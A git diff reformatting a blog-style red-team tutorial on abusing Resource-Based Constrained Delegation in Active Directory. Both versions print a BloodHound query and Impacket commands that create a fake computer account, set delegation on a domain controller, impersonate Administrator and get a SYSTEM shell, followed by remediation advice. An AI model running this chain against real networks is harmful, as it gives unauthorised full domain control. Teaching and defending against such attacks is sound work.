@@ -4,131 +4,128 @@ title: "Attack Path: Resource-Based Constrained Delegation (RBCD)"
 date: 2025-12-01 14:00:00 +0000
 categories: [active-directory, rbcd, privilege-escalation]
 tags: [red-team, kerberos, bloodhound]
-mermaid: true
+description: "Master Resource-Based Constrained Delegation (RBCD) exploitation - from BloodHound analysis to full domain dominance"
 ---
 
-<style>
-  /* Custom Styles for this Post */
-  .post-container { font-family: 'Segoe UI', sans-serif; }
-  
-  /* The "Card" look to replace lines */
-  .content-card {
-    background: #f8f9fa; /* Light grey background */
-    border-left: 5px solid #2c3e50; /* Dark blue accent */
-    padding: 20px;
-    margin-bottom: 30px;
-    border-radius: 0 8px 8px 0;
-    box-shadow: 2px 2px 10px rgba(0,0,0,0.05);
-  }
+# Attack Path: Resource-Based Constrained Delegation (RBCD)
+*The Path to Domain Dominance*
 
-  /* Dark Mode Terminal Box */
-  .terminal-box {
-    background-color: #1e1e1e;
-    color: #00ff41; /* Hacker Green */
-    font-family: 'Consolas', 'Courier New', monospace;
-    padding: 15px;
-    border-radius: 5px;
-    border: 1px solid #333;
-    margin: 10px 0;
-    white-space: pre-wrap;
-    font-size: 0.9em;
-  }
+---
 
-  /* Highlight Box for Key Concepts */
-  .concept-box {
-    background: #e3f2fd;
-    border: 1px solid #90caf9;
-    color: #0d47a1;
-    padding: 15px;
-    border-radius: 8px;
-    margin-bottom: 20px;
-  }
-
-  /* Warning / Red Team Note */
-  .red-team-note {
-    background: #fff3e0;
-    border-left: 5px solid #ef6c00;
-    padding: 15px;
-    margin: 20px 0;
-    font-style: italic;
-  }
-
-  h1 { color: #2c3e50; font-weight: 800; border-bottom: none !important; }
-  h2 { color: #c0392b; font-weight: 700; margin-top: 0; }
-  h3 { color: #34495e; }
-</style>
-
-<div class="post-container">
-
-<div class="content-card">
-  <h2>🚀 The Executive Summary</h2>
-  <p><strong>Resource-Based Constrained Delegation (RBCD)</strong> is a critical Active Directory misconfiguration that allows an attacker to escalate from a standard user to Domain Admin permissions.</p>
-  <p>Unlike traditional attacks that require high privileges, RBCD exploits a subtle permission: <strong>Write access on a computer object.</strong></p>
+<div class="key-concept" markdown="1">
+**Executive Summary:**
+Resource-Based Constrained Delegation (RBCD) is a critical Active Directory misconfiguration that allows an attacker to escalate from a standard user to Domain Admin permissions.
 </div>
 
-<div class="content-card">
-  <h2>🧠 The Attack Concept</h2>
-  <div class="concept-box">
-    <strong>The Core Vulnerability:</strong><br>
-    The attribute <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> controls which services can impersonate users to a specific computer. If we can write to this attribute, we control who can access the machine.
-  </div>
-   
-<div class="content-card">
-  <h2>🔍 Phase 1: Reconnaissance</h2>
-  <p>We use <strong>BloodHound</strong> to identify the vulnerability. We are looking for an edge that allows us to modify a computer object.</p>
-  <div class="red-team-note">
-    <strong>BloodHound Query:</strong><br>
-    MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
-  </div>
-  
+Unlike traditional attacks that require high privileges, RBCD exploits a subtle permission: **Write access on a computer object.**
+
+---
+
+## The Attack Concept
+
+<div class="vulnerability-alert" markdown="1">
+**The Core Vulnerability:**
+The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` controls which services can impersonate users to a specific computer. If an attacker can write to this attribute, they control who can access the machine.
 </div>
 
-<div class="content-card">
-  <h2>⚔️ Phase 2: Exploitation</h2>
-  <p><strong>Scenario:</strong> User <code>Stannis</code> has GenericWrite on <code>KINGSLANDING$</code> (DC).</p>
+---
 
-  <h3>Step A: Create the "Fake" Service</h3>
-  <p>We need a service account to interact with Kerberos. We use the default <code>MachineAccountQuota</code> to create one.</p>
-  <div class="terminal-box">
-$ proxychains addcomputer.py domain/stannis:Pass -method LDAPS -computer-name EVILPC$
-[+] EVILPC$ created successfully!
-  </div>
+## Phase 1: Reconnaissance
 
-  <h3>Step B: Weaponize the Target</h3>
-  <p>We write our new computer's name into the target's delegation attribute.</p>
-  <div class="terminal-box">
-$ proxychains rbcd.py domain/stannis:Pass -delegate-from EVILPC$ -delegate-to KINGSLANDING$ -action write
-[+] Attribute modified successfully.
-  </div>
+We use **BloodHound** to identify the vulnerability. We are looking for an edge that allows us to modify a computer object.
 
-  <h3>Step C: The Kerberos Abuse</h3>
-  <p>We request the impersonation ticket (S4U2Self + S4U2Proxy).</p>
-  <div class="terminal-box">
-$ proxychains getST.py domain/EVILPC$:Pass -spn cifs/kingslanding -impersonate Administrator
-[*] Impersonating Administrator...
-[+] Saving ticket to Administrator.ccache
-  </div>
+<div class="key-concept" markdown="1">
+**BloodHound Query:**
+`MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p`
 </div>
 
-<div class="content-card" style="border-left-color: #27ae60;">
-  <h2 style="color: #27ae60;">🏁 Phase 3: Domain Dominance</h2>
-  <p>With the ticket in hand, we execute commands as <strong>SYSTEM</strong> on the Domain Controller.</p>
-  <div class="terminal-box">
-$export KRB5CCNAME=Administrator.ccache$ proxychains wmiexec.py domain/Administrator@kingslanding -k -no-pass
+---
 
-C:\Windows\system32> whoami
-nt authority\system
-  </div>
+## Phase 2: Exploitation
+
+**Scenario:** User `Stannis` has GenericWrite on `KINGSLANDING$` (Domain Controller).
+
+### Step A: Create the "Fake" Service
+
+We need a service account to interact with Kerberos. We use the default `MachineAccountQuota` (typically 10) to create one.
+
+```bash
+# Create fake computer account
+proxychains addcomputer.py domain/stannis:Pass -method LDAPS -computer-name EVILPC$
+```
+
+<div class="success-box" markdown="1">
+**[+] EVILPC$ created successfully!**
 </div>
 
-<div class="content-card">
-  <h2>🛡️Remediation</h2>
-  <p>How do we advise clients to fix this?</p>
-  <ul>
-    <li><strong>Restrict MachineAccountQuota:</strong> Set it to 0 so users cannot create the "Fake Service."</li>
-    <li><strong>Tiered Administration:</strong> Ensure standard users do not have Write permissions on Tier 0 assets.</li>
-    <li><strong>Monitoring:</strong> Alert on changes to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</li>
-  </ul>
+### Step B: Weaponize the Target
+
+We write our new computer's SID into the target's delegation attribute.
+
+```bash
+# Modify msDS-AllowedToActOnBehalfOfOtherIdentity
+proxychains rbcd.py domain/stannis:Pass -delegate-from EVILPC$ -delegate-to KINGSLANDING$ -action write
+```
+
+<div class="success-box" markdown="1">
+**[+] Attribute modified successfully.**
 </div>
 
+### Step C: The Kerberos Abuse
+
+We request the impersonation ticket (S4U2Self + S4U2Proxy) for the Administrator account.
+
+```bash
+# Get Service Ticket
+proxychains getST.py domain/EVILPC$:Pass -spn cifs/kingslanding -impersonate Administrator
+```
+
+<div class="success-box" markdown="1">
+**[+] Saving ticket to Administrator.ccache**
 </div>
+
+---
+
+## Phase 3: Domain Dominance
+
+With the ticket in hand, we execute commands as **SYSTEM** on the Domain Controller.
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+proxychains wmiexec.py domain/Administrator@kingslanding -k -no-pass
+```
+
+<div class="success-box" markdown="1">
+**C:\Windows\system32> whoami**
+**nt authority\system**
+</div>
+
+---
+
+## Remediation
+
+<div class="warning-box" markdown="1">
+**How to protect your environment:**
+
+- **Restrict MachineAccountQuota:** Set it to 0 so users cannot create "Fake Services."
+- **Tiered Administration:** Ensure standard users do not have Write permissions on Tier 0 assets (DCs).
+- **Monitoring:** Alert on changes to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
+</div>
+
+---
+
+## Key Takeaways
+
+<div class="takeaway-box" markdown="1">
+**RBCD exploits Write access on computer objects** - Often overlooked in audits
+</div>
+
+<div class="takeaway-box" markdown="1">
+**MachineAccountQuota is a default enabler** - Setting it to 0 is a critical hardening step
+</div>
+
+<div class="takeaway-box" markdown="1">
+**BloodHound is essential for discovery** - Automated path finding reveals RBCD opportunities
+</div>
+
+---
